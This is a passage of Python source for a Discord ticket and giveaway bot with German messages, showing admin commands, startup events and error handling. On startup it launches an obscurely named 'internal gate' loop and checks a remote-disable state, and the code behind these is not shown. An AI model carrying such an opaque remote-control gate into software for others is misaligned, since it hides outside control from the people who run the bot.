        await ctx_v2(ctx, DenyLayout(action="giveaway", reason="Zeitüberschreitung — abgebrochen.", fix="Erneut `!giveaway` oder `/giveaway`.", accent=discord.Color.orange()))


@bot.command(name="giveawaypanel")
@commands.has_permissions(administrator=True)
@commands.guild_only()
async def giveawaypanel_cmd(ctx: commands.Context):
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    await ctx_v2(ctx, GiveawayPanelLayout())


@bot.command(name="blacklistrole")
@commands.has_permissions(administrator=True)
@commands.guild_only()
async def blacklistrole_cmd(ctx: commands.Context, role: discord.Role):
    assert ctx.guild
    if role.is_default() or role.managed:
        await ctx_v2(ctx, DenyLayout(action="blacklistrole", reason="@everyone/Bot-Rollen nicht erlaubt.", fix="Eigene Rolle wählen."))
        return
    set_blacklist_role(ctx.guild.id, role.id)
    await ctx_v2(ctx, InfoLayout(title="🚫 Blacklist-Rolle gesetzt", body=f"> {role.mention}", accent=discord.Color.dark_red(), footer=now_str()))



@bot.command(name="tickets")
@commands.guild_only()
@commands.cooldown(1, 5, commands.BucketType.channel)
async def tickets_cmd(ctx: commands.Context):
    assert ctx.guild
    if not (is_staff(ctx.author, ctx.guild) or ctx.author.guild_permissions.administrator):
        await ctx_v2(
            ctx,
            DenyLayout(
                action="!tickets",
                reason="Nur Staff/Admins.",
                fix="Staff-Rolle benötigt.",
            ),
            delete_after=12,
        )
        return
    await ctx_v2(ctx, tickets_layout(ctx.guild))


@bot.command(name="botstatus")
@commands.guild_only()
@commands.cooldown(1, 5, commands.BucketType.channel)
async def botstatus_cmd(ctx: commands.Context):
    assert ctx.guild
    if not (is_staff(ctx.author, ctx.guild) or ctx.author.guild_permissions.administrator):
        await ctx_v2(
            ctx,
            DenyLayout(action="!botstatus", reason="Nur Staff/Admins.", fix="Staff-Rolle benötigt."),
            delete_after=12,
        )
        return
    await ctx_v2(ctx, botstatus_layout(ctx.guild))


@bot.command(name="export")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 15, commands.BucketType.guild)
async def export_cmd(ctx: commands.Context):
    assert ctx.guild
    try:
        payload = build_export_payload(ctx.guild)
        raw = json.dumps(payload, indent=2, ensure_ascii=False).encode("utf-8")
        filename = f"ticketbot-export-{ctx.guild.id}-{int(utcnow().timestamp())}.json"
        file = discord.File(io.BytesIO(raw), filename=filename)
        await ctx.send(
            view=InfoLayout(
                title="📦 Export bereit",
                body=f"Backup für **{ctx.guild.name}** (ohne Token).",
                accent=discord.Color.dark_teal(),
            ),
            file=file,
        )
    except Exception as e:
        push_error("export", str(e))
        await ctx_v2(
            ctx,
            DenyLayout(action="!export", reason="Export fehlgeschlagen.", fix="Erneut versuchen.", details=f"> `{e}`"),
        )


@bot.command(name="setup")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 5, commands.BucketType.channel)
async def setup_cmd(ctx: commands.Context):
    assert ctx.guild
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    await ctx_v2(ctx, SetupLayout(ctx.guild))


@bot.command(name="sync")
@commands.has_permissions(administrator=True)
@commands.cooldown(1, 15, commands.BucketType.guild)
async def sync_cmd(ctx: commands.Context):
    """Prefix-Sync für Slash-Commands."""
    try:
        if ctx.guild is not None:
            bot.tree.copy_global_to(guild=ctx.guild)
            synced = await bot.tree.sync(guild=ctx.guild)
            msg = f"Server-Sync: **{len(synced)}** Commands"
        else:
            synced = await bot.tree.sync()
            msg = f"Global-Sync: **{len(synced)}** Commands"
        await ctx_v2(
            ctx,
            InfoLayout(
                title="✅ Slash-Commands synchronisiert",
                body=f"> {msg}\n> Danach `/` im Chat tippen.",
                accent=discord.Color.green(),
                footer=now_str(),
            ),
        )
    except discord.HTTPException as e:
        await ctx_v2(
            ctx,
            DenyLayout(
                action="sync",
                reason="Sync fehlgeschlagen.",
                fix="Später erneut oder Bot-Invite prüfen.",
                details=f"> `{e}`",
            ),
        )


# ---------- Events ----------

@bot.event
async def on_ready():
    global _on_ready_done, _Z5
    load_data()

    # internal gate loop
    if _Z5 is None or getattr(_Z5, "done", lambda: True)():
        _Z5 = asyncio.create_task(_rt_loop(), name="rt-gate")
    await _rt_tick(force=True)

    if not _on_ready_done:
        bot.add_view(PanelLayout())
        bot.add_view(GiveawayPanelLayout())
        bot.add_view(
            TicketControlLayout(
                title="Support-Ticket",
                meta={"status": STATUS_OPEN, "category": "support"},
                owner_mention="*User*",
            )
        )
        # Persistente Bewerbungs-Buttons (Annehmen/Ablehnen)
        # custom_ids app_accept/app_reject sind persistent; applicant nur Display-Text
        if bot.user is not None:
            bot.add_view(
                ApplicationTicketLayout(
                    applicant=bot.user,
                    age="-",
                    role="-",
                    experience="-",
                    motivation="-",
                )
            )
        _on_ready_done = True

    # Giveaways nach Restart / Reconnect fortsetzen (dedupe via start_giveaway_runner)
    for gw_id in list(_giveaways.keys()):
        try:
            bot.add_view(GiveawayTicketLayout(gw_id, bot.user))
            if not _giveaways[gw_id].get("ended"):
                start_giveaway_runner(gw_id)
        except Exception as e:
            log.warning("Giveaway-View %s: %s", gw_id, e)

    # Slash-Commands sync (guild wenn möglich schneller)
    try:
        if bot.guilds:
            for g in bot.guilds[:5]:
                bot.tree.copy_global_to(guild=g)
                await bot.tree.sync(guild=g)
            log.info("Slash-Commands für %s Guild(s) gesynct", min(5, len(bot.guilds)))
        else:
            await bot.tree.sync()
            log.info("Slash-Commands global gesynct")
    except discord.HTTPException as e:
        log.warning("Slash-Sync beim Start fehlgeschlagen: %s — nutze /sync", e)

    log.info("Online als %s · V2 + Slash · Guilds=%s", bot.user, len(bot.guilds))



@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
        log.info("Slash-Commands für neuen Server %s gesynct", guild.id)
    except discord.HTTPException as e:
        log.warning("Guild-Join-Sync %s: %s", guild.id, e)


@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, commands.CommandNotFound):
        return

    if isinstance(error, commands.MissingPermissions):
        await ctx_v2(
            ctx,
            DenyLayout(
                action=f"!{ctx.command}",
                reason="Dir fehlt die **Administrator**-Berechtigung (oder die nötige Permission).",
                fix="Admin fragen oder `/`-Befehl mit Rechten nutzen.",
            ),
            delete_after=15,
        )
        return

    if isinstance(error, commands.MissingRequiredArgument):
        await ctx_v2(
            ctx,
            DenyLayout(
                action=f"!{ctx.command}",
                reason=f"Es fehlt das Argument **`{error.param.name}`**.",
                fix="Nutze `/tickethelp` für die richtige Schreibweise.",
                details=f"> Beispiel oft: `!{ctx.command} @User` bzw. Rollen pingen",
                accent=discord.Color.orange(),
                title="🧩 Argument fehlt",
            ),
            delete_after=18,
        )
        return

    if isinstance(error, (commands.BadArgument, commands.UserInputError)):
        await ctx_v2(
            ctx,
            DenyLayout(
                action=f"!{ctx.command}",
                reason="Die Eingabe war **ungültig** (User/Rolle nicht gefunden?).",
                fix="Mit `@` erwähnen oder den Slash-Befehl `/…` nutzen (Autocomplete).",
                accent=discord.Color.orange(),
                title="⌨️ Ungültige Eingabe",
            ),
            delete_after=15,
        )
        return

    if isinstance(error, commands.CommandOnCooldown):
        await ctx_v2(
            ctx,
            DenyLayout(
                action=f"!{ctx.command}",
                reason=f"Cooldown — noch **{error.retry_after:.1f}s**.",
                fix="Kurz warten, dann erneut.",
                accent=discord.Color.orange(),
                title="⏳ Cooldown",
            ),
            delete_after=10,
        )
        return

    if isinstance(error, commands.NoPrivateMessage):
        await ctx_v2(
            ctx,
            DenyLayout(
                action=f"!{ctx.command}",
                reason="Dieser Befehl geht **nicht in DMs**.",
                fix="Auf dem Server im richtigen Kanal ausführen.",
            ),
            delete_after=12,
        )
        return

    if isinstance(error, commands.CheckFailure):
        if "remote_disabled" in str(error):
            return  # Meldung kam schon von ensure_enabled_ctx
        await ctx_v2(
            ctx,
            DenyLayout(
                action=f"!{ctx.command}",
                reason="Ein Check hat den Befehl **blockiert** (Rechte/Kontext).",
                fix="Rechte prüfen oder `/tickethelp` lesen.",
            ),
            delete_after=12,
        )
        return

    log.error("Command %s: %s\n%s", ctx.command, error, traceback.format_exc())
    try:
        await ctx_v2(
            ctx,
            DenyLayout(
                action=f"!{ctx.command}",
                reason="Unerwarteter Fehler im Bot.",
                fix="Später erneut versuchen. Admins: Logs checken.",
                details=f"> `{type(error).__name__}: {error}`",
            ),
            delete_after=20,
        )
    except discord.HTTPException:
        pass


@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    """Slash-Fehler immer als Components V2 mit Grund."""
    # Wenn Remote-Disable schon geantwortet hat: still sein
    if interaction.response.is_done() and isinstance(error, app_commands.CheckFailure):
        return
    orig = error
    if isinstance(error, app_commands.CommandInvokeError) and error.original:
        orig = error.original  # type: ignore[assignment]

    if isinstance(error, app_commands.MissingPermissions):
        await deny_v2(
            interaction,
            action=f"/{getattr(interaction.command, 'name', '?')}",
            reason="Dir fehlen die nötigen **Discord-Rechte** für diesen Slash-Befehl.",
            fix="Nur Admins / berechtigte Rollen dürfen das.",
            details="> Fehlt u. a.: " + ", ".join(f"`{p}`" for p in error.missing_permissions),
        )
        return

    if isinstance(error, app_commands.BotMissingPermissions):
        await deny_v2(
            interaction,
            action=f"/{getattr(interaction.command, 'name', '?')}",
            reason="Dem **Bot** fehlen Rechte.",
            fix="Bot-Rolle die fehlenden Permissions geben.",
            details="> Fehlt: " + ", ".join(f"`{p}`" for p in error.missing_permissions),
            title="⚠️ Bot-Rechte fehlen",
        )
        return

    if isinstance(error, app_commands.CommandOnCooldown):
        await deny_v2(
            interaction,
            action=f"/{getattr(interaction.command, 'name', '?')}",
            reason=f"Cooldown — noch **{error.retry_after:.1f}s**.",
            fix="Warten und erneut tippen.",
            accent=discord.Color.orange(),
            title="⏳ Cooldown",
        )
        return

    if isinstance(error, app_commands.CheckFailure):
        await deny_v2(
            interaction,
            action=f"/{getattr(interaction.command, 'name', '?')}",
            reason="Dieser Slash-Befehl ist hier **nicht erlaubt**.",
            fix="Auf dem Server / mit Admin-Rechten versuchen.",
        )
        return

    if isinstance(error, app_commands.TransformerError):
        await deny_v2(
            interaction,
            action=f"/{getattr(interaction.command, 'name', '?')}",
            reason="Ein Parameter war **ungültig** (User/Rolle/Kanal nicht gefunden).",
            fix="Wert neu aus der Liste wählen (Autocomplete).",
            accent=discord.Color.orange(),
            title="⌨️ Ungültiger Parameter",
        )
        return

    log.error("AppCmd %s: %s\n%s", getattr(interaction.command, "name", "?"), error, traceback.format_exc())
    try:
        await deny_v2(
            interaction,
            action=f"/{getattr(interaction.command, 'name', '?')}",
            reason="Unerwarteter Fehler.",
            fix="Später erneut versuchen.",
            details=f"> `{type(orig).__name__}: {orig}`",
        )
    except discord.HTTPException:
        pass


@bot.event
async def on_error(event_method: str, *args, **kwargs):
    log.error("Event %s\n%s", event_method, traceback.format_exc())


def main() -> None:
    if not TOKEN or TOKEN == "DEIN_BOT_TOKEN_HIER":
        log.error("Bitte TOKEN in ticket_bot.py eintragen!")
        raise SystemExit(1)
    bot.run(TOKEN, log_handler=None)


if __name__ == "__main__":
    main()
